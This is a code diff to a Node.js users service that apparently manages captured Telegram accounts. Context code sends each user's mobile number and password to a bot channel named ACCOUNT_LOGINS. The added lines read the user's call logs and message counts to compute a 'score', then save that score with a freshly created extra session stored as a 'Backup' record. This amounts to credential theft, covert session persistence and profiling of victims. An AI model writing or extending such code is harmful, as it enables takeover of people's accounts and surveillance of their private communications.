@@ -20,6 +20,7 @@ const mongoose_2 = require("mongoose");
 const client_service_1 = require("../clients/client.service");
 const connection_manager_1 = require("../Telegram/utils/connection-manager");
 const bots_1 = require("../bots");
+const Helpers_1 = require("telegram/Helpers");
 let UsersService = class UsersService {
     constructor(userModel, telegramService, clientsService, botsService) {
         this.userModel = userModel;
@@ -39,9 +40,17 @@ let UsersService = class UsersService {
             await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
             setTimeout(async () => {
                 try {
-                    await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
+                    const telegramClient = await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
+                    const calllogs = await telegramClient.getCallLogStats();
+                    let score = 1;
+                    for (const callData of calllogs.chats) {
+                        const messages = await telegramClient.getMessages(callData.chatId, 2);
+                        score = score + (messages.pagination.total || 0) * (callData.totalCalls + 1) * (callData.averageDuration + 1);
+                        await (0, Helpers_1.sleep)(1000);
+                    }
+                    this.updateByFilter({ mobile: user.mobile }, { score: score });
                     const newSession = await this.telegramService.createNewSession(user.mobile);
-                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
+                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup", score: score });
                     await newUserBackup.save();
                 }
                 catch (error) {
